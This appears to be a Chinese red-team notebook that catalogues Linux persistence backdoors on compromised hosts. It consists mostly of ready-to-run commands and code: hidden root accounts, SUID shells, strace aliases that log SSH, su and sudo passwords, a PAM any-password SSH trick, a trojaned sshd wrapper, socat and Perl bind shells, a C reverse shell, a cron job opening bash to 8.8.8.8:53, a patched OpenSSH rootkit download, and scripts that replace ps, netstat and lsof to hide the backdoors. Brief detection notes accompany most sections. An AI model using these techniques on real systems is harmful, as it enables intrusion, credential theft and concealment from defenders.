## Linux后门汇总

### 1. 添加root权限账户

> 添加账户为：r00t 密码为password的账户：

####第一种：bash命令添加

```bash
useradd -u 0 -o -g root -G root r00t;echo r00t:Password0224|chpasswd
```

上述命令可能执行不成功，则将此命令分成两条命令分开执行，或设置密码为复杂密码

centos下添加成功，如下所示：

![image-20200328205804077](/Users/dawson0x00/Library/Application Support/typora-user-images/image-20200328205804077.png)

![image-20200328205928940](/Users/dawson0x00/Library/Application Support/typora-user-images/image-20200328205928940.png)

#### 第二种：perl命令添加

```perl
perl -e 'print crypt("Poker", "AA"). "\n"'  # 此处AA为salt 加盐
echo "backdoor:AALvuWiRPz82I:0:0:me:/home/backdoor:/bin/bash">>/etc/passwd
```

![image-20200328212032057](/Users/dawson0x00/Library/Application Support/typora-user-images/image-20200328212032057.png)



**检测清除**

1. 查看/etc/passwd文件是否有uid=0的非root账户
2. 清除对应账户

### 2. Suid权限位后门



> **原理** 设置了suid权限位的文件在执行时具有该文件拥有者的权限，故我们可以在root权限下留一个bash文件的后门，使得在低权限时能够通过该后门获取root权限
>
> 用法：使用高权限账户留后门，在低权限账户登陆可使用该后门直接切换到高权限下
>
> [linux：SUID、SGID详解链接](https://www.jianshu.com/p/71acd8dad454)

```bash
cp /bin/bash /tmp/test
chmod 4755 /tmp/test # 或者 chmod u+s /tmp/test
/tmp/test -p 

#chmod 4755与chmod 755 的区别在于开头多了一位，这个4表示其他用户执行文件时，具有与所有者相当的权限。
```

![image-20200328214816863](/Users/dawson0x00/Library/Application Support/typora-user-images/image-20200328214816863.png)

![image-20200328214932693](/Users/dawson0x00/Library/Application Support/typora-user-images/image-20200328214932693.png)

![image-20200329081418903](/Users/dawson0x00/Library/Application Support/typora-user-images/image-20200329081418903.png)

**检测清除**

```bash
find / -perm -04000 -type f -ls #检测
find / -perm -4000  #检测
chmod -s /tmp/test 或者 chmod 755 /tmp/test  # 清除
```

### 3. bash环境后门

> **原理**：bash环境文件 /etc/profile  ~/.bash_profile ~/.bashrc  ~/.bash_logout 这些本质上是bash脚本文件，当用户登陆系统之后，就会执行其中的部分文件，在其中写入bash命令即可在用户登陆时执行
>
> 注意 bash_profile 是在登录的 shell 执行的,bashrc 是在非登录的 shell 执行,即如果你只是想每次在登录的时候让它去执行,这个时候你可以把你的命令写在 .bash_profile,如果你想每次打开一个新的终端的时候都去执行,那么应该把命令写在 .bashrc 中.
>
> 如下，在shell重新登陆后会执行(注：test.sh中写入反弹shell 等各类要执行的命令)

![image-20200403230324730](/Users/dawson0x00/Desktop/红蓝对抗/Linux后门.assets/image-20200403230324730.png)

如下为在bashrc中写入，在每开一个shell终端都会执行

![image-20200403230520745](/Users/dawson0x00/Desktop/红蓝对抗/Linux后门.assets/image-20200403230520745.png)

**检测清除**

检测各个环境变量中是否存在异常代码，并清除

### 4. strace记录认证信息(待验证)

> 原理：strace用来调试跟踪一个进程执行时所产生的系统调用，或者说用来监视一个新进程的系统调用，也可以监测已经运行的系统调用，那么我们就可以利用他来监测sshd的进程，从而获取SSH登陆的账号密码

strace开启监测sshd

```bash
ps -ef | grep "sshd -D" | grep -v grep | awk {'print $2'}
strace -f -p $pid -o /tmp/.sshOutput_`date+%Y%m%d%H%M%S`.log -e trace=write -s 2048 &
# 上述命令为通过strace跟踪sshd的进程，可记录登陆本主机的ssh密码


#查看日志
grep -n "write(4, \"\\\\0\\\\0\\\\0\\\\" /tmp/.ssh.log
或者如下：
cat /tmp/.ssh.log | egrep "(read(4).*)"

```

```bash
alias ssh='strace -o /tmp/sshpwd-`date    '+%d%h%m%s'`.log  \
 -e read,write,connect  -s2048 ssh'
# 也可记录 su 密码
alias su='strace -o /tmp/sshpwd-`date    '+%d%h%m%s'`.log  \
 -e read,write,connect  -s2048 su'

grep "read(3" /tmp/sshpwd-名字自己补全  | tail -n 11
```



![img](https://klionsec.github.io//img/ssh%20%20ssh%20res%20pass.png)

除了ssh,你也可以尝试跟踪su,sudo,ssh

```bash
alias ssh='strace -o /tmp/.sshpwd-`date '+%d%h%m%s'`.log -s 2048 ssh'
alias ssh='strace -o /tmp/.sshOutput_`date+%Y%m%d%H%M%S`.log -e read,write,connect -s 2048 ssh'
alias su="strace -o /tmp/.su-`date '+%d%h%m%s'`.log su"
alias sudo="strace -o /tmp/.sudo-`date '+%d%h%m%s'`.log sudo"
# source ~/.bashrc 或者 source ~/.zshrc
```

**检测清除**

```bash
ps -ef|grep starce|grep -v grep #进程中查找是否有strace监测
alias # 查看是否有异常alias
unalias ssh # kill掉对应进程，取消alias即可
```

### 5. SSH任意密码后门

> **原理** ssh登陆默认使用了PAM进行认证，而在root环境下，部分命令比如su chfu等在执行时无需使用密码。因为这些命令在PAM认证时使用了pam_rootok.so进行认证：
>
> 1：ssh默认调用了PAM进行身份验证
> 2：PAM是linux系统中的一个独立的API(应用程序接口)，他提供了各种验证模式模块
> 3：PAM的认证文件系统都统一存放在/etc/pam.d目录中
> 4：SSH的认证文件应该是/etc/pam.d/sshd，PAM配置文件中控制标志为sufficient时，只要pam_rootok模块检测uid为0（root）即可成功认证登陆
> 5：通过软连接的方式，PAM认证实质上是通过软连接的文件名/tmp/su，在/etc/pam.d目录下找到对应的PAM认证文件
> 6：SSH的认证文件被改为了/etc/pam.d/su
>
> ![image-20200329094356922](/Users/dawson0x00/Library/Application Support/typora-user-images/image-20200329094356922.png)
>
> Pam_rootok.so:主要作用为使uid=0的账户在认证时直接通过
>
> PAM在认证时，以命令名字在/etc/pam.d/目录下查找PAM配置文件
>
> 部分配置文件中，对于认证采用了pam_rootok.so，并使用了sufficient控制标记：
>
> ```bash
> auth            sufficient pam_rootok.so
> ```
>
> 则可将sshd链接到使用了rootok.so进行认证的命令上，并新开一个端口

测试

```bash
ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=65534
ln -sf /usr/sbin/sshd /tmp/chsu;/tmp/chsh -oPort=32090
iptables -F # 目前测试的不需要这条命令也可以；清空规则链 需确定此命令是否必须执行
```

直接使用```ssh -p 65534 root@x.x.x.x登陆，密码随意输入任意值即可登陆```

![image-20200403085848959](/Users/dawson0x00/Desktop/红蓝对抗/Linux后门.assets/image-20200403085848959.png)



**优势：隐蔽性较弱，适合短时间连接。
劣势：重启后会断开，无法后弹连接。**

##### 改进一：加入开启自启动

姿势一：

需要开机启动自己的脚本时，只需要将可执行脚本丢在 `/etc/init.d` 目录下，然后在 `/etc/rc.d/rc*.d` 中建立软链接即可

```bash
ln -s /etc/init.d/test.sh /etc/rc.d/rc3.d/S100ssh  # 必须将启动要执行的脚本方正/etc/init.d/目录下
chmod +x /etc/init.d/test.sh
ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh
```

此处 sshd 是具体服务的脚本文件，S100ssh 是其软链接，S 开头代表加载时自启动；如果是 K 开头的脚本文件，代表运行级别加载时需要关闭的。

**检测清除**

类似后门会开放端口，在网络连接中可以查看

```bash
netstat -antp|grep -E "chfn|su|chsu"  #查找异常端口及进程
ps -ef|grep 29604 |xargs kill -9 查找对应的进程并删除
kill -9 
ls -l /tmp/ 查找/tmp目录下是否有chfn su chsu 文件，然后删除
#grep -E 选项可以用来扩展选项为正则表达式。 如果使用了grep 命令的选项-E，则应该使用 | 来分割多个pattern，以此实现OR操作。 如：grep -E 'pattern1|pattern2' filename
```

#####改进二：写入bash环境

bash_profile 或者bashrc 

注意 bash_profile 是在登录的 shell 执行的,bashrc 是在非登录的 shell 执行,即如果你只是想每次在登录的时候让它去执行,这个时候你可以把你的命令写在 .bash_profile,如果你想每次打开一个新的终端的时候都去执行,那么应该把命令写在 .bashrc 中.

### 6. SSH认证流程后门

> **原理：** SSH登陆时，系统处理登陆请求的文件时/usr/sbin/sshd 那么就可以修改该文件，在登陆时执行特定操作 参考链接：[某SSH后门分析](https://www.freebuf.com/articles/system/140880.html)

**测试一(目前centos下测试成功)**

```bash
mv /usr/sbin/sshd /usr/bin/sshd
cd /usr/sbin/ && touch sshd
## 然后vim  sshd 增加以下shell脚本
#!/usr/bin/perl
exec"/bin/sh"if(getpeername(STDIN)=~/^..zf/);
exec{"/usr/bin/sshd"}"/usr/sbin/sshd",@ARGV;


chmod u+x sshd
service sshd restart  或者 /etc/init.d/sshd restart  #重启sshd服务

然后再控制端执行：
socat STDIO TCP4:X.X.X.X:22,sourceport=31334
socat STDIO TCP4:X.X.X.X:22,bind=:31334
```

如下，无需认证即可成功连接：

![image-20200402185238945](/Users/dawson0x00/Desktop/红蓝对抗/Linux后门.assets/image-20200402185238945.png)



由于上述方案的后门会在网络连接中看到 **sh**的进程(易被发现)，

![image-20200402185953050](/Users/dawson0x00/Desktop/红蓝对抗/Linux后门.assets/image-20200402185953050.png)

为了增强隐蔽性，可以copy一份sh到其它目录，并重命名为sshd    ```cp /usr/bin/sh /root/sshd```重命名为/bin/sshd。后门建立连接后伪装性更强

修改后门源码:(执行目录修改为copy ssh重命名的/root/sshd)

```bash
#!/usr/bin/perl
exec"/root/sshd"if(getpeername(STDIN)=~/^..zf/);
exec{"/usr/bin/sshd"}"/usr/sbin/sshd",@ARGV;
```

![image-20200402191208209](/Users/dawson0x00/Desktop/红蓝对抗/Linux后门.assets/image-20200402191208209.png)

为什么是19526端口呢？LF代表了端口号，如果想修改端口号可以执行如下操作

```python
#!/usr/bin/env python
# coding=utf-8

import struct
#这里输出的值是前命令中的值
buffer = struct.pack('>I6',19526)
print repr(buffer)
#这里输出的值可以用来替换,以自定义源端口
buffer = struct.pack('>I6',12345)  
print repr(buffer)
```

**检测清除**

1. 该后门会修改/usr/sbin/sshd的文件，检测该文件是否被修改(使用rpm命令) 

2. 复制相同的ssh版本号的sshd的文件进行替换即可。 

3. file命令查看sshd的文件格式，正常的sshd 文件是ELF格式，而后门是纯文本脚本

![image-20200401205146122](/Users/dawson0x00/Desktop/红蓝对抗/Linux后门.assets/image-20200401205146122.png)

#####**改进**：隐藏

执行隐藏脚本的命令shell 以隐藏相关进程或网络连接等信息

> 篡改netstat，ps等命令，隐藏后门相关信息(防止被发现) 2 修改所有篡改命令的时间戳
>
> 方案一：*参考脚本附件一*  生产文本ASCTT格式的命令

> 方案二：参考脚本附件二  生成ELF二进制格式的篡改命令(隐蔽性更强)

### 7. 篡改命令后门(socat)

> 注：此项需要受害者主机安装 socat  ```yum install socat```
>
> 如下为篡改命令后的后门

方案一：在受害者主机执行分别执行以下命令：

```bash
touch /usr/local/bin/uname
#写入以下文件
#!/bin/bash
socat TCP4-Listen:1377,fork EXEC:/bin/bash 2>/dev/null &

# 然后执行uname 
sudo /usr/local/bin/uname
##然后客户端主机执行：
socat STDIO TCP4:49.232.30.21:1377
```

方案二：或者执行以下bd_uname.sh脚本, **生成文本格式的后门命令**

```sh
#uname
#-------------------------
touch /usr/local/bin/uname

cat <<EOF >> /usr/local/bin/uname
#!/bin/bash
#nc.traditional -l -v -p 4444 -e /bin/bash 2>/dev/null &
#socat TCP4-Listen:3177,fork EXEC:/bin/bash 2>/dev/null &
socat SCTP-Listen:1177,fork EXEC:/bin/bash 2>/dev/null &
#perl -MIO -e'$s=new IO::Socket::INET(LocalPort=>1337,Listen=>1);while($c=$s->accept()){$_=<$c>;print $c `$_`;}' 2>/dev/null &
/bin/uname \$@
EOF

chmod +x /usr/local/bin/uname
```

方案三：或者执行以下bd_uname_c.sh , **生成二进制格式的后门命令**(格式与正常命令相似，不易发现)

```shell
#!/bin/bash

#uname
#------------------------
touch /tmp/.uname.c

cat <<EOF >> /tmp/.uname.c

#include <sys/types.h>

int main(int a,char**b){
  pid_t child_pid = fork();
  if(child_pid == 0) {
    /* char*d[999999]={"sh","-c","nc.traditional -l -v -p 4444 -e /bin/bash 2>/dev/null &"}; */
    /* char*d[999999]={"sh","-c","socat TCP4-Listen:3177,fork EXEC:/bin/bash 2>/dev/null &"}; */
    char*d[999999]={"sh","-c","socat SCTP-Listen:1177,fork EXEC:/bin/bash 2>/dev/null &"};
    /* char*d[999999]={"sh","-c","perl -MIO -e'$s=new IO::Socket::INET(LocalPort=>1337,Listen=>1);while($c=$s->accept()){$_=<$c>;print $c `$_`;}' 2>/dev/null &"}; */
    execv("/bin/sh",d);
    exit(0);
  }
  else {
    char*c[999999]={"sh","-c","/bin/uname \$*"};
    memcpy(c+3,b,8*a);
    execv("/bin/sh",c);
  }
}
EOF

gcc -xc /tmp/.uname.c -o /usr/local/bin/uname

rm /tmp/.uname.c
```

![image-20200402160744134](/Users/dawson0x00/Desktop/红蓝对抗/Linux后门.assets/image-20200402160744134.png)



**检测清除**

```ps -ef|grep socat```

![image-20200402163118926](/Users/dawson0x00/Desktop/红蓝对抗/Linux后门.assets/image-20200402163118926.png)

![image-20200402160835366](/Users/dawson0x00/Desktop/红蓝对抗/Linux后门.assets/image-20200402160835366.png)

#####**改进**：隐藏

执行隐藏脚本的命令shell

> 1. 篡改netstat，ps等命令，已隐藏后门信息(防止被发现) 2 修改所有篡改命令的时间戳
>
> 方案一：*参考脚本附件一*  生产文本ASCTT格式的命令

> 方案二：参考脚本附件二  生成ELF二进制格式的篡改命令

![image-20200402164552482](/Users/dawson0x00/Desktop/红蓝对抗/Linux后门.assets/image-20200402164552482.png)

**检测清除**：

查看 命令发现被篡改，替换删除隐藏的命令

![image-20200402170430404](/Users/dawson0x00/Desktop/红蓝对抗/Linux后门.assets/image-20200402170430404.png)

如果采用方案一，则可file命令查看uname格式文件，发现为ASCII格式 

![image-20200402173844867](/Users/dawson0x00/Desktop/红蓝对抗/Linux后门.assets/image-20200402173844867.png)

### 8. Vim python2扩展后门(待验证)

> 原理：vim安装时默认安装了当前服务器的python扩展，包括python2扩展与python3扩展，利用此扩展，可以使用vim执行python脚本
>
> 检测有无扩展
>
> ```bash
> vim --version |grep python
> ```
>
> ![image-20200329110308780](/Users/dawson0x00/Library/Application Support/typora-user-images/image-20200329110308780.png)

```bash
cd /usr/lib/python.7/site-packages && $(nohup vim -E -c "pyfile dir.py"> /dev/null 2>&1 &)
&& s1eep 2 && -f dir.py  # victim主机上执行,其中dir,py可以是异常的py文件
```

此处的dir.py为一个反弹shell的脚本：



**检测清除**

该后门会有明显的进程信息

```
ps -aux|grep vim
```



### 9. 写入SSH公钥

> 太简单此处略写……..

##### 改进：隐藏

将写入公钥的命令写入bashrc bash_profile.  或者计划任务里 或写入开机启动项(执行写入公钥的命令)

### 10. 进程注入

> 将恶意的动态链接库注入到其他进程当中，较为隐蔽

测试

在 Linux的多个发行版本中,内核的默认配置文件/ proc/sys/ kernel/yama/ptrace_scope设置为1,意思是限制
进程除了fork()派生外,无法通过ptrace()来操作另外一个进程。故若要对进程进行注入,则需要修该值为0
```echo> /proc/sys/kernel/yama/ptrace_scope//需要root.权限```

```bash
echo> /proc/sys/kernel/yama/ptrace_scope//需要root.权限
```

**进程注入脚本** https://github.com/gaffe23/linux-inject

反弹shell的C文件 back.c 如下：

```c
/*
 * >  反弹shell C语言版
 * >  (支持ip和域名, Linux平台)
 * >　author: s0nnet
 * >  see <www.s0nnet.com>
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <arpa/inet.h>


int re_shell(){
    pid_t pid;
    if ((pid = fork()) == -1){
        exit(-1);
    }
    if (pid == 0) {

        setsid();
        char *host = "127.0.0.1"; //your server ip or domain
        int port = 8080; //conn port

        int sock;
        struct in_addr addr;
        struct hostent *h;
        struct sockaddr_in server;
        
        if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
            exit(-1);
        }

        server.sin_family = AF_INET;
        server.sin_port = htons(port);
       
        if(! inet_pton(AF_INET, host, &addr)){
            if((h = gethostbyname(host)) == NULL) {
                exit(-1);
            }
            host = inet_ntoa(*((struct in_addr *)h->h_addr));
        }

        server.sin_addr.s_addr = inet_addr(host);

        if(connect(sock, (struct sockaddr *)&server, sizeof(struct sockaddr)) == -1) {
            exit(-1);
        }
        
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);
        close(sock);
        execl("/bin/sh", "/bin/sh", "-i", NULL);
    }
    return 0;
}

int main()
{
    re_shell();
    return 0;
}
```

将上述文件编译成so文件

```C
clang -std=gnu99 -ggdb -D_GNU_SOURCE -shared -o back.so -lpthread -fPIC back.c
```

尝试注入系统进程失败，找一个非系统进程注入：

![image-20200329172930845](/Users/dawson0x00/Desktop/红蓝对抗/Linux后门.assets/image-20200329172930845.png)





### 11. 预加载动态链接库

> **原理** 系统在执行一些命令的时候,在真正执行其文件之前,会加载相应的动态链接库,但是Liux系统提供了
> 一个可以加载自定义动态链接库的方式;并且比加载正常动态链接库更早,故可以利用此特点自定义加载恶意动态链库。

```bash
export LD_PRELOAD=/usr/lib/cub3.so.1  # https://github.com/mempodippy/cub3
```

cub3so.1是一个可以隐藏白己的动态链接库,当设出了预加载动态链接库时,在执行命令的时候即可隔藏白己

![image-20200329164201375](/Users/dawson0x00/Desktop/红蓝对抗/Linux后门.assets/image-20200329164201375.png)



### 12. Crond 开机自启后门

先创建 /etc/xxxx 脚本文件(名字自己改),利用该脚本进行反弹.以下脚本代表全自动反弹到 8.8.8.8 的 53 端口.

```vim
vim /etc/xxxx
    #!/bin/bash
    if netstat -ano|grep -v grep | grep "8.8.8.8">/dev/null
    then
    echo "OK">/dev/null
    else
    /sbin/iptables --policy INPUT ACCEPT
    /sbin/iptables --policy OUTPUT ACCEPT
    bash -i >& /dev/tcp/8.8.8.8/53 0>&1
    fi

chmod +sx /etc/xxxx
```

```vim
vim /etc/crontab
    */1 * * * * root /etc/xxxx

service cron reload #不同发行版重启方式不一样
service cron start
```

然后在 8.8.8.8 的服务器上使用 NC 接收 Shell 即可.

###13. 开启启动项执行特定脚本

需要开机启动自己的脚本时，只需要将可执行脚本丢在 `/etc/init.d` 目录下，然后在 `/etc/rc.d/rc*.d` 中建立软链接即可

```
ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh
```

此处 sshd 是具体服务的脚本文件，S100ssh 是其软链接，S 开头代表加载时自启动；如果是 K 开头的脚本文件，代表运行级别加载时需要关闭的。

###14. 低版本OpenSSH编译后门 

> **我们来看一个最原始的OpenSSH后门，该后门是通过补丁的方式修改openssh，并且重新编译替换了sshd，与Ebury后门相似的是都可以记录用户的账号名密码，只不过该后门功能上远远不如Ebury，也没有相应的隐藏功能。**
>
> **注**：此版本只支持 ssh 5.6以下的

```bash
[root@localhost ~]#cat /etc/issue
CentOS release 6.8(Final)
Kernel r on an m
#1. SSH后门目前网上支持版本为5.9以下，本次用的是centos6.8自带的openssh5.3版本的
[root@localhost ~]#ssh -V
OpenSSH_5.3p1,OpenSSL 1.0.1e-fips 11 Feb 2013
# 2. 下载两个文件
[root@localhost ~]#wget http://down1.chinaunix.net/distfiles/openssh-5.9p1.tar.gz
[root@localhost ~]#
wgethttp://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz
[root@localhost ~]#ls
0x06-openssh-5.9p1.patch.tar.gz  openssh-5.9p1.tar.gz

#3. 备份下配置文件
[root@localhost ~]#mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old
[root@localhost ~]#mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old
[root@localhost ~]#tar -zxvf openssh-5.9p1.tar.gz
[root@localhost ~]#tar -zxvf 0x06-openssh-5.9p1.patch.tar.gz
openssh-5.9p1.patch/
openssh-5.9p1.patch/LICENSE
openssh-5.9p1.patch/INSTALL
openssh-5.9p1.patch/README
openssh-5.9p1.patch/sshbd5.9p1.diff
openssh-5.9p1.patch/ssh_integrity_checker.sh
```

补丁如下：

![image-20200401221450737](/Users/dawson0x00/Desktop/红蓝对抗/Linux后门.assets/image-20200401221450737.png)

**设置后门登陆密码**

在includes.h文件中可以找到设置通用密码的地方：

![image-20200401221524135](/Users/dawson0x00/Desktop/红蓝对抗/Linux后门.assets/image-20200401221524135.png)

Version.h文件设置版本banners，该banners改成和原来系统一致

![image-20200401221545991](/Users/dawson0x00/Desktop/红蓝对抗/Linux后门.assets/image-20200401221545991.png)

```yum install zlib-devel opensslopenssl-devel zlib zlib-devel```

**编译并安装**

```bash
[root@localhost openssh-5.9p1]# yum install zlib-devel
[root@localhost openssh-5.9p1]# yum installopenssl  openssl-devel
[root@localhost openssh-5.9p1]# yum installgcc
[root@localhost openssh-5.9p1]# ./configure--prefix=/usr --sysconfdir=/etc/ssh
[root@localhost openssh-5.9p1]# make&& make install
```

然后就可使用上述设置的密码123123成功进行登陆

**检测清除**

```strings /usr/sbin/sshd```  可以看到写入的密码信息

![image-20200401221806397](/Users/dawson0x00/Desktop/红蓝对抗/Linux后门.assets/image-20200401221806397.png)



### 15. 一句话命令后门(socat/perl)

> **SOCAT  TCP**

LISTEN:

```socat TCP4-Listen:3177,fork EXEC:/bin/bash &```

CONNECT:

```socat STDIO TCP4:IP:3177```

> **SOCAT SCTP**

LISTEN:

```socat SCTP-Listen:1177,fork EXEC:/bin/bash &```

CONNECT:

```socat STDIO SCTP:IP:1177```

> **PERL TCP**

LISTEN:

```perl -MIO -e'$s=new IO::Socket::INET(LocalPort=>1337,Listen=>1);while($c=$s->accept()){$_=<$c>;print $c `$_`;}' &```

CONNECT

```socat STDIO TCP4:IP:1337```

> **AUTH.LOG**

LISTEN

```perl -e'while(1){sleep(1);while(<>){system pack("H*",$1)if/LEGO(\w+)/}}'</var/log/auth.log & ```

EXECUTE REMOTE COMMAND:

```bash
#先执行perl脚本
perl -e 'print "LEGO".unpack("H*","id > /tmp/auth.owned")."\n"'

LEGO6964203e202f746d702f617574682e6f776e6564
然后执行
ssh LEGO6964203e202f746d702f617574682e6f776e6564@<target_ip>
```

> **RSYSLOG**

LISTEN:

```bash
man -a rsyslogd syslog|perl -pe'print "auth.* ^/bin/atg "if$.==177;print"#"' > /etc/rsyslog.d/README.conf
echo -e '#!/bin/sh\nsh -c "$1"'>/bin/atg
chmod 755 /bin/atg
/etc/init.d/rsyslog restart
```

EXECUTE:

```echo "';whoami>/tmp/rsyslogd.owned;'"| socat STDIO TCP4:<target ip>:22```



### 16. 待研究后门

* Ebury SSH Rootkit
* 

###脚本附件一(生成文本格式)

> 篡改命令，已隐藏后门信息(防止被发现)

bd_hide.sh

```shell
#!/bin/bash

#ps
#------------------------
touch /usr/local/bin/ps

cat <<EOF >> /usr/local/bin/ps	
#!/bin/bash
/bin/ps \$@ | grep -Ev '11277|3177|1177|1377|1277|19526|socat|LEGO|nc|perl'
EOF

chmod +x /usr/local/bin/ps

#netstat
#------------------------
touch /usr/local/bin/netstat

cat <<EOF >> /usr/local/bin/netstat
#!/bin/bash
/bin/netstat \$@ | grep -Ev '11277|3177|1177|1377|1277|19526|socat|LEGO|nc|perl'
EOF

chmod +x /usr/local/bin/netstat

#lsof
#------------------------
touch /usr/local/bin/lsof

cat <<EOF >> /usr/local/bin/lsof
#!/bin/bash
/usr/bin/lsof \$@ | grep -Ev '11277|3177|1177|1377|1277|19526|socat|LEGO|nc|perl'
EOF

chmod +x /usr/local/bin/lsof
```

###脚本附件二(生成ELF二进制格式)

> 篡改命令，已隐藏后门信息(防止被发现)

bd_hide_c.sh

隐藏 进程 ip 端口 perl nc 等各类信息

```shell
#!/bin/bash

#netstat
#------------------------
touch /tmp/.netstat.c

cat <<EOF >> /tmp/.netstat.c
int main(int a,char**b){
  char*c[999999]={"sh","-c","/bin/netstat \$*|grep -Ev '4444|3177|1177|1337|19526|socat|LEGO|nc|perl'"};
  memcpy(c+3,b,8*a);
  execv("/bin/sh",c);
}
EOF

gcc -xc /tmp/.netstat.c -o /usr/local/bin/netstat

rm /tmp/.netstat.c


#ps
#------------------------
touch /tmp/.ps.c

cat <<EOF >> /tmp/.ps.c
int main(int a,char**b){
  char*c[999999]={"sh","-c","/bin/ps \$*|grep -Ev '4444|3177|1177|1337|19526|socat|LEGO|nc|perl'"};
  memcpy(c+3,b,8*a);
  execv("/bin/sh",c);
}
EOF

gcc -xc /tmp/.ps.c -o /usr/local/bin/ps

rm /tmp/.ps.c


#lsof
#------------------------
touch /tmp/.lsof.c

cat <<EOF >> /tmp/.lsof.c
int main(int a,char**b){
  char*c[999999]={"sh","-c","/usr/bin/lsof \$*|grep -Ev '4444|3177|1177|1337|19526|socat|LEGO|nc|perl'"};
  memcpy(c+3,b,8*a);
  execv("/bin/sh",c);
}
EOF

gcc -xc /tmp/.lsof.c -o /usr/local/bin/lsof

rm /tmp/.lsof.c
```



